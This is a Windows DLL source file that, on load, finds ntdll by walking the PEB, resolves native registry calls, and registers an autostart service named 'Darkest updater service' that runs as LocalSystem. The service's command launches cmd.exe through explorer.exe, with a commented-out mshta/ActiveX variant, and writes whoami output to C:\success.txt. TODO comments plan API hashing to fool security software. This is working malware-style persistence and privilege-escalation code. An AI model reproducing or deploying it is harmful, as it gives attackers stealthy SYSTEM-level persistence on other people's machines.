#include "library.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#ifdef _WIN32
#define EXPORT __declspec(dllexport)
#else
#define EXPORT
#endif

API_TABLE api;

HMODULE GetLibraryBase(const wchar_t *dllName) {
    //PEB is located at offset 60
    ULONG_PTR peb = __readgsqword(0x60);

    // ldr offset 0x18 from PEB
    ULONG_PTR ldr = *(ULONG_PTR *) (peb + 0x18);

    //get head of linked list of libraries
    LIST_ENTRY *list_head = (LIST_ENTRY *) (ldr + 0x20);
    LIST_ENTRY *current_node = list_head->Flink;

    //This part is probably unnecessary, as the ntdll is almost always on the second jump, and kernel32.dll on the third
    //with further imports after that
    while (current_node != list_head) {
        LDR_DATA_TABLE_ENTRY *libraryEntry = CONTAINING_RECORD(current_node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (libraryEntry->FullDllName.Buffer != NULL) {
            //TODO add hashing to possibly fool software we are loading kernel32.dll
            //TODO add index checking that if we find libraries that are not supposed to be here, exit immediately
            if (wcsstr(libraryEntry->FullDllName.Buffer, dllName) != NULL ||
                wcsstr(libraryEntry->FullDllName.Buffer, dllName) != NULL) {
                return (HMODULE) libraryEntry->DllBase;
            }
        }
        current_node = current_node->Flink;
    }
    return nullptr;
}

void *GetProcAddressByHash(HMODULE hModule, const char *targetHash) {
    //Get the DOS headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((BYTE *) hModule + dosHeader->e_lfanew);

    //Export dir
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY) ((BYTE *) hModule + exportDirEntry.VirtualAddress);

    //Knowing the export dir, we know the offsets of the three function export tables
    DWORD *nameArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfNames);
    WORD *ordinalArray = (WORD *) ((BYTE *) hModule + exportDir->AddressOfNameOrdinals);
    DWORD *functionArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfFunctions);

    //find the function name through the name export
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        //we have to cast to BYTE * here to force moving forward by one byte at a time
        //RVA -> VA conversion could break otherwise
        const auto functionName = (char *) ((BYTE *) hModule + nameArray[i]);
        if (strcmp(functionName, targetHash) == 0) {
            const WORD functionOrdinal = ordinalArray[i];
            const DWORD functionRVA = functionArray[functionOrdinal];
            return (void *) ((BYTE *) hModule + functionRVA);
        }
    }
    return NULL;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            OnProcessAttach();
            break;
        case DLL_PROCESS_DETACH:
            break;
        default:
            return FALSE;
    }
    return TRUE;
}

void ArchiveNativeAPIs(HMODULE hNtdll) {
    // Replace 'ManualExportWalker' with your existing export-walking function
    api.NtCreateKey = (pNtCreateKey) GetProcAddress(hNtdll, "NtCreateKey");
    api.NtSetValueKey = (pNtSetValueKey) GetProcAddress(hNtdll, "NtSetValueKey");
    api.NtClose = (pNtClose) GetProcAddress(hNtdll, "NtClose");
    api.NtOpenKey = (pNtOpenKey) GetProcAddress(hNtdll, "NtOpenKey");
}

void OnProcessAttach() {
    HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
    ArchiveNativeAPIs(ntdll);
    RegisterService();
}

HANDLE CreateRegistryKey() {
    HANDLE newKeyHandle = NULL;

    UNICODE_STRING registryPath;
    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);

    ULONG disp = 0;

    NTSTATUS status = api.NtCreateKey(&newKeyHandle, KEY_ALL_ACCESS, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);
    if (status == 0) {
        return newKeyHandle;
    }
    return nullptr;
}

///
/// @param path - absolute path through the registry
/// @return the opened handle, or a nullpointer on fail
HANDLE OpenRegistryKey(PCWSTR path) {
    UNICODE_STRING registryPath;
    InitUnicodeString(&registryPath, path);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);

    HANDLE handle = NULL;

    if (api.NtOpenKey(&handle, OBJ_CASE_INSENSITIVE, &objAttr) == 0)
        return handle;
    return nullptr;
}

NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, void *value,
                             unsigned long dataSize) {
    UNICODE_STRING entryName;
    InitUnicodeString(&entryName, name);

    if (keyHandle != NULL) {
        auto result = api.NtSetValueKey(keyHandle, &entryName, 0, type, value, dataSize);
        if (result != 0) {
            char errorMsg[64];
            sprintf(errorMsg, "Write unsuccessful. NTSTATUS: 0x%08X", result);
            MessageBoxA(nullptr, errorMsg, "ERROR", MB_OK | MB_ICONERROR);
            api.NtClose(keyHandle);
            return result;
        }
        return 0;
    }
    MessageBoxA(nullptr, "Key has not been opened",
                "ERROR",
                MB_OK | MB_ICONERROR);

    return api.NtClose(keyHandle);
}

int RegisterService() {
    HANDLE keyHandle = CreateRegistryKey();
    if (keyHandle == NULL) {
        MessageBoxA(nullptr, "Key has not been created",
                    "ERROR",
                    MB_OK | MB_ICONERROR);
        return -1;
    }

    //wchar_t* imgPath = L"\"C:\\Windows\\System32\\mshta.exe\" javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe /c whoami > C:\\success.txt',0,false);window.close();";
    int start = 2; // autorun on start
    wchar_t* imgPath = L"explorer.exe /root,\"C:\\Windows\\System32\\cmd.exe /c whoami > C:\\success.txt\"";
    int type = 16; // standalone process
    int errCont = 0; // do not handle errors, just silently exit
    wchar_t * objectName = L"LocalSystem"; // forces the service to run as the NT-AUTHORITY/system
    wchar_t * displayName = L"Darkest updater service";

    SetRegistryKeyValue(keyHandle, L"ImagePath", REG_EXPAND_SZ, imgPath, (wcslen(imgPath) + 1) * sizeof(wchar_t));
    SetRegistryKeyValue(keyHandle, L"Start", REG_DWORD, &start, sizeof(int));
    SetRegistryKeyValue(keyHandle, L"Type", REG_DWORD, &type, sizeof(int));
    SetRegistryKeyValue(keyHandle, L"ErrorControl", REG_DWORD, &errCont, sizeof(int));
    SetRegistryKeyValue(keyHandle, L"ObjectName", REG_SZ, objectName, (wcslen(objectName) + 1) * sizeof(wchar_t));
    SetRegistryKeyValue(keyHandle, L"DisplayName", REG_SZ, displayName, (wcslen(displayName) + 1) * sizeof(wchar_t));

    api.NtClose(keyHandle);
    return 0;
}


void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString) {
        USHORT length = (USHORT) (wcslen(SourceString) * sizeof(WCHAR));
        DestinationString->Length = length;
        DestinationString->MaximumLength = length + sizeof(WCHAR);
        DestinationString->Buffer = (PWSTR) SourceString;
    } else {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
    }
}




